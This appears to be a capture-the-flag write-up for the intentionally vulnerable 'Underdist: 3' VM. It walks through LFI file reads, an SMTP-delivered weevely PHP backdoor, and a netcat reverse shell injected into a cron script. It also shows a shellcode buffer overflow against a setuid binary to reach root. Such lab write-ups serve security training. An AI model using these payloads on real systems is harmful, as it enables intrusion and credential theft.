@@ -1,0 +1,462 @@
+.. include:: /pentest_links.txt
+
+.. _underdist3:
+
+****************
+Underdist: 3
+****************
+
+Setup
+=====
+
+Setting up the VMware VM
+------------------------
+
+The challenge is `Underdist: 3 <https://www.vulnhub.com/entry/underdist-3,108/>`_. The VM comes packaged as `Underdist-3.zip <http://download.vulnhub.com/underdist/Underdist-3.zip>`_, which is a zip archive containing a Virtualbox VDI (VMware vmdk file). See :ref:`VMSetup` for background on using the VMware vmdk file. underdist3 runs Debian 7 (Wheezy).
+
+Setting up your environment
+---------------------------
+
+
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  mkdir -p $PT
+  cd $PT
+  # download underdist3_setup.sh
+  curl --silent --remote-name https://pentest-meetup.appspot.com/html/_downloads/underdist3_setup.sh
+  # edit as needed; later the recon will give you TARGET IP
+  source underdist3_setup.sh
+
+The source for :file:`underdist3_setup.sh` (:download:`underdist3_setup.sh`) should look something like the following.
+
+.. literalinclude:: underdist3_setup.sh
+   :language: bash
+
+
+Reconnaisance
+=============
+
+Network reconnaissance
+----------------------
+
+Start with some standard network reconnaissance looking for the vulnerable host:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -sn -PE -oA nmap_sn $SUBNET
+  $SUDO chown $USER.$USER nmap_sn.*
+  # use the grep-able output to get a list of target hosts
+  grep Up nmap_sn.gnmap | cut -d" " -f2 > $TARGETS
+  # use the xml output to get an html report
+  xsltproc nmap_sn.xml -o nmap_sn.html
+
+Here we know $TARGET and can fill it in $PT/underdist3_setup.sh and also edit :file:`/etc/hosts` to add "underdist3.com" (``echo "$TARGET underdist3.com" | $SUDO tee -a /etc/hosts``).
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/nmap
+
+  $SUDO nmap -A -vv -T3 --max-retries 5 -Pn -oA nmap_A $TARGET
+  $SUDO chown $USER.$USER nmap_A.*
+  xsltproc nmap_A.xml -o nmap_A.html
+
+Running this reveals:
+
+* port 22: OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+
+* port 25: Postfix smtpd
+
+* port 80: Apache httpd 2.2.22 ((Debian))
+
+The servers indicate Debian 7 (see `Wheezy Package: openssh-server (1:6.0p1-4+deb7u2)  <https://packages.debian.org/wheezy/openssh-server>`_ and `Wheezy Package: apache2 (2.2.22-13+deb7u4) <https://packages.debian.org/wheezy/apache2>`_). 
+
+Initial port reconnaissance
+---------------------------
+
+Port 22 & 25 reconnaissance via hydra
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+SSH reconnaissance shows SSH "does not support password authentication":
+
+.. code-block:: console
+
+  hydra -l underdist -P /usr/share/wordlists/metasploit-jtr/password.lst -t 16 underdist3.com ssh
+  # [ERROR] target ssh://192.168.1.100:22/ does not support password authentication.
+
+SMTP reconnaissance shows "[ERROR] SMTP LOGIN AUTH, either this auth is disabled
+or server is not using auth: 503 5.5.1 Error: authentication not enabled":
+
+.. code-block:: console
+
+  hydra -l underdist -P /usr/share/wordlists/metasploit-jtr/password.lst -t 16 underdist3.com smtp
+  # OUTPUT = [ERROR] SMTP LOGIN AUTH, either this auth is disabled
+  # or server is not using auth: 503 5.5.1 Error: authentication not enabled
+
+So we're not brute-forcing passwords through ports 22 or 25.
+
+Port 80 reconnaissance via dirb & nikto
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Out of habit we do :program:`dirb` and :program:`nikto` scans.
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/spider
+
+  nikto -output nikto.html -C all -host $HOST -port 80
+  dirb  http://$HOST/ -o dirb80.txt
+
+:program:`dirb` on port 80 found :file:`index.html`, :file:`server-status`, and directories :file:`cgi-bin` and :file:`ascii`.
+
+:program:`nikto` reported very little not already known.
+
+Browsing the web server
+-----------------------
+
+:file:`index.html` contains a commented link ``<a href="v.php?a=YXNjaWkxLnR4dA==">`` which base64 decodes to ``<a href="v.php?a=ascii1.txt">``. With it we have a LFI (local file inclusion) exploit. Here we illustrate getting :file:`/etc/passwd`:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/spider
+
+  FILE="/etc/passwd"
+  FILEPATH="../../../../../..$FILE"
+  B64FP=$(echo -n "$FILEPATH" | base64)
+  curl --silent http://underdist3.com/v.php?a=$B64FP
+
+Here are the interesting lines from :file:`/etc/passwd`:
+
+.. code-block:: console
+
+  root:x:0:0:root:/root:/bin/bash
+  ###################### SNIP ######################
+  www-data:x:33:33:www-data:/var/www:/bin/sh
+  ###################### SNIP ######################
+  underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
+  ###################### SNIP ######################
+  cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
+  smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
+  smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
+  ###################### SNIP ######################
+
+
+The Exploit
+===========
+
+
+Getting a reverse PHP shell via SMTP
+------------------------------------
+
+At this point we'd like to get a remote exploit but the software versions appear to be recent enough to not be subject to easy remote exploits. SSH avoids password login so that's a dead end, too. And HTTP so far has yielded at most file downloads. Perhaps we can deliver an SMTP message containing a reverse PHP script.
+
+Overcoming SMTP message restrictions
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+From `Dan's Mail Format Site: Body: Line Length <http://mailformat.dan.info/body/linelength.html>`_:
+
+  The standards document for the format of e-mail messages, RFC 2822 (the successor to RFC 822, the classic document that established the standards that have been followed ever since), says this about the length of lines in an e-mail message:
+
+      There are two limits that this standard places on the number of characters in a line. Each line of characters MUST be no more than 998 characters, and SHOULD be no more than 78 characters, excluding the CRLF. 
+
+  Update: As of 2008, a new document, RFC 5322, has been released to update the standard; however, it retains the above wording regarding line length.
+
+So when sending a PHP script over SMTP, care must be given for the line length. For example, if you were to base64 encode the pentestmonkey PHP reverse shell it's single line is over 7300 characters - far too long. Trying to email ``<?php eval(base64_decode("'$B64RS'");?>`` (where $B64RS is the base64-encdoded reverse shell) might be a problem.
+
+Getting a PHP reverse shell to work
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+We normally take the pentestmonkey PHP reverse shell; make the normal edits to connect to our Kali ip and port; then make additional edits to use a pty instead of a pipe. That would not connect. Reverting to only change the Kali ip and port would connect and immediately terminate with no output. The fact it connected at all indicated that the SMTP approach could work, but more work was needed. And we're here to exploit, not do blind debugging.
+
+So we searched for an alternative and came up with `epinna/weevely3 <https://github.com/epinna/weevely3>`_ which is installed by default in Kali.
+
+What mail is local and where's the mailbox?
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+First, what mail is considered local? The :program:`postfix` :file:`/etc/postfix/main.cf` configuration file entry "mydestination" entry defines the local mail (here we'll use "@Underdist"):
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/exploit
+
+  FILE="/etc/postfix/main.cf"
+  FILEPATH="../../../../../..$FILE"
+  B64FP=$(echo -n "$FILEPATH" | base64)
+  curl --silent http://underdist3.com/v.php?a=$B64FP
+  # OUTPUT = mydestination = home.lan, Underdist, localhost.localdomain, localhost
+
+Second, where does the mail go? The :file:`/etc/login.defs` shows the default mail directory is :file:`/var/mail/` (and mail goes to :file:`/var/mail/$USER`):
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/exploit
+
+  FILE="/etc/login.defs"
+  FILEPATH="../../../../../..$FILE"
+  B64FP=$(echo -n "$FILEPATH" | base64)
+  curl --silent http://underdist3.com/v.php?a=$B64FP
+  # OUTPUT = MAIL_DIR        /var/mail
+
+Uploading the reverse PHP shell
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+First we create the weevely PHP reverse shell:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/exploit
+
+  PASSWORD=password   # password for connecting to PHP reverse shell
+  REVSH=backdoor.php  # reverse shell filename
+  weevely generate $PASSWORD $REVSH
+
+Then we upload via email using :program:`socat`'s built-in :program:`mail.sh`:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/exploit
+
+  cat $REVSH | \
+  socat EXEC:"/usr/share/doc/socat/examples/mail.sh -f hacker@kali www-data@Underdist",fdin=3,fdout=4 TCP4:underdist3.com:25,crnl
+
+Exploiting the PHP reverse shell
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Now we fire off the PHP reverse shell:
+
+.. code-block:: bash
+
+  PT=$HOME/pentest/underdist3
+  source $PT/underdist3_setup.sh
+  cd $PT/exploit
+
+  B64REVSH=$(echo -n "../../../../var/mail/www-data" | base64)
+  B64REVSH=${B64REVSH%%=*}
+  weevely http://underdist3.com/v.php?a=$B64REVSH password
+
+In the weevely shell, run ``:help`` to get help. We quickly find :file:`b_gd214dg/foo.backup`, download it, and use :kbd:`Cntl-D` to exit :program:`weevely`:
+
+.. code-block:: console
+
+  weevely http://underdist3.com/v.php?a=$B64REVSH password
+  :file.ls
+  # OUTPUT = b_gd214dg
+  :file.ls b_gd214dg
+  # OUTPUT = foo.backup
+  :file.download b_gd214dg/foo.backup foo.backup
+  # OUTPUT = True
+
+Back on the Kali side (in another terminal window) we see that foo.backup is a PEM RSA private key and figure out we can SSH to underdist3 as user cuervo:
+
+.. code-block:: bash
+
+  file foo.backup
+  chmod 600 foo.backup
+  ssh -i foo.backup cuervo@underdist3.com
+
+And so we've finally got a "normal" login on underdist3 as cuervo.
+
+Exploiting SSH access to underdist3
+-----------------------------------
+
+Getting from cuervo to underdist SSH access
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+The prior section left off with SSH login as cuervo. Quickly you realize cuervo doesn't have any special ``sudo -l`` access and reconnaissance turns up these files in :file:`/home/underdist` (with the now-inaccessible :file:`.bin` directory):
+
+.. code-block:: console
+
+  cd /home/underdist
+  ls -al
+  # OUTPUT = .bin  # this looks interesting, but inaccessible for now
+  # OUTPUT = cronping.py
+  # OUTPUT = ips.txt
+  cat cronping.py
+  cat ips.txt
+
+:program:`cronping.py` takes :file:`ips.txt` and injects the lines into :program:`os.open()`. So rather than IPs, :file:`ip.txt` could be most any shell command.
+
+.. code-block:: python
+
+  #!/usr/bin/env python
+
+  import os
+
+  def ips():
+      f=open("ips.txt")
+      return f
+
+  def save(d):
+      f=open("/tmp/logs", "a+")
+      f.write(d)
+      f.close()
+
+  def command(c):
+      p=os.popen('ping -c 1 -w 1 %s|grep received|cut -d " " -f 4' % (c), "r")
+      return p.read()
+
+  def verify():
+      save("- - - - - - - - - - - - - - - - - - - - - - - - -\n")
+      for ip in ips():
+          ip=ip.replace("\n", "")
+          if command(ip)=="1\n":
+              save("Host %s Up\n" % (ip))
+          else:
+              save("Host %s Down\n" % (ip))
+
+  verify()
+
+:file:`ips.txt` is a list of IP addresses, but can be anything and user cuervo has write access.
+
+.. code-block:: console
+
+  198.27.100.204
+  31.13.85.33
+  173.194.42.63
+  23.76.228.226
+  72.21.81.85
+  185.12.13.15
+
+We can only hope that :file:`cronping.py` is an underdist cron job. With :file:`ips.txt` injecting into :file:`cronping.py`, cuervo can execute arbitrary commands as underdist. There are several approaches that can be taken. Here we start up a reverse shell listener on Kali first (run the ``id`` command :
+
+.. code-block:: bash
+
+  socat - TCP-LISTEN:$PORT
+  id
+
+Now set up :file:`ips.txt` to start a reverse shell (substitue in your Kali IP and port):
+
+.. code-block:: bash
+
+  MYIP=192.168.1.104
+  MYPORT=4444
+  cat > ips.txt <<EOF
+  127.0.0.1 ; nc $MYIP $MYPORT -e /bin/bash ; echo nothing
+  EOF
+
+And popping on the Kali side (should be within a minute) the shell pops and we get our first glimpse of :file:`.bin`:
+
+.. code-block:: console
+
+  id
+  python -c 'import pty; pty.spawn("/bin/bash")'
+  export TERM=linux
+  ls -al .bin
+  # OUTPUT = -rwsr-xr-x 1 root      root      4986 oct 27  2014 echo
+
+Getting root from setuid root program :program:`.bin/echo`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Now that setuid root ``echo`` just has to be exploitable. We present here an exploit that doesn't require :program:`gdb`, just the bash script :program:`checksec` (and even that really isn't required).
+
+.. code-block:: console
+
+  cd .bin
+  ./echo
+  # OUTPUT = Violación de segmento
+
+Wow - already a segment violation. We need `checksec.sh`_ to analyze this binary:
+
+.. code-block:: console
+
+  wget --quiet https://raw.githubusercontent.com/slimm609/checksec.sh/master/checksec
+  chmod +x checksec
+  ./checksec --file ./echo
+
+The analysis reveals:
+
+.. code-block:: console
+
+  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	FORTIFIED FORTIFY-able  FILE
+  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   No	0		2	./echo
+
+No RELRO, no stack canaries, and the stack is executable - how much easier can they make it? We will vaguely follow `Simple exploit walkthrough <http://blairmason.me/iwg/exploit/walkthrough/>`_, though our walkthrough will be even simpler.
+
+In general we have a stack overflow and we want to figure out how many bytes are needed to overwrite the return address: that is, how many bytes does it take to get a segmentation fault? With a hand-done binary search we discover it takes 304, and we show 'FEEDBEEF' clobbers the EIP instruction pointer:
+
+.. code-block:: none
+  :emphasize-lines: 9
+
+  ./echo $(python -c "print 303*'A'")
+  # NO SEGFAULT
+  ./echo $(python -c "print 304*'A'")
+  # OUTPUT = Violación de segmento
+  # Show we can write FEEDBEEF to the ip (little-endian it's '\xEF\xBE\xED\xFE')
+  ./echo $(python -c "print 304*'A' + '\xEF\xBE\xED\xFE'")
+  # OUTPUT = Violación de segmento
+  dmesg | grep segfault | tail -n 1
+  # OUTPUT = [33607.444577] echo[12083]: segfault at feedbeef ip feedbeef sp bffff750 error 5
+
+The segfault says the code should be somewhere around the stack pointer address 0xbffff750 so we'll start by changing the 0xFEEDBEEF ('\xEF\xBE\xED\xFE' little-endian) to that address. In case the address is not exact we'll change the 'A' to 'x90' (the NOP command), providing a "NOP sled" up to our exploit code. And we'll change the last bytes of the NOP sled to an actual shellcode exploit. The exploit we'll choose is http://shell-storm.org/shellcode/files/shellcode-752.php (21 bytes long), so our NOP sled will be 304-21= 283 bytes. Here goes our first attempt (knowing that the starting with the stack pointer may not work):
+
+.. code-block:: console
+  :emphasize-lines: 5
+
+  ./echo $(python -c "print (283*'\x90' + \
+      '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68' + \
+      '\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd' + \
+      '\x80' + \
+      '\x50\xf7\xff\xbf') ")
+  # OUTPUT = Violación de segmento
+
+That didn't work. So we'll bump up the address by half the NOP sled size (128 or 0x80) until we get success (here at 0xbffff930). You may have to bump it up to a higher number:
+
+.. code-block:: console
+  :emphasize-lines: 5
+
+  ./echo $(python -c "print (283*'\x90' + \
+      '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68' + \
+      '\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd' + \
+      '\x80' + \
+      '\x30\xf9\xff\xbf') ")
+  # Prompt changes to #
+  id
+  # OUTPUT = uid=1000(underdist) gid=1000(underdist) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(underdist)
+  ls /root
+  # OUTPUT = flag.txt  r.sh
+  cat /root/flag.txt
+
+
+                          (`.         ,-,
+                          ` `.    ,;' /
+                           `.  ,'/ .'
+                            `. X /.'
+                  .-;--''--.._` ` (
+                .'            /   `
+               ,           ` '   Q '
+               ,         ,   `._    \
+            ,.|         '     `-.;_'
+            :  . `  ;    `  ` --,.._;
+             ' `    ,   )   .'
+                `._ ,  '   /_
+                   ; ,''-,;' ``-
+                    ``-..__``--`
+
+			
+			  http://underc0de.org
+	
+
+
+  Felicidades H4x0r! resolviste el reto!
+
+  Mandame tu solucionario a: a.denegado@gmail.com
+
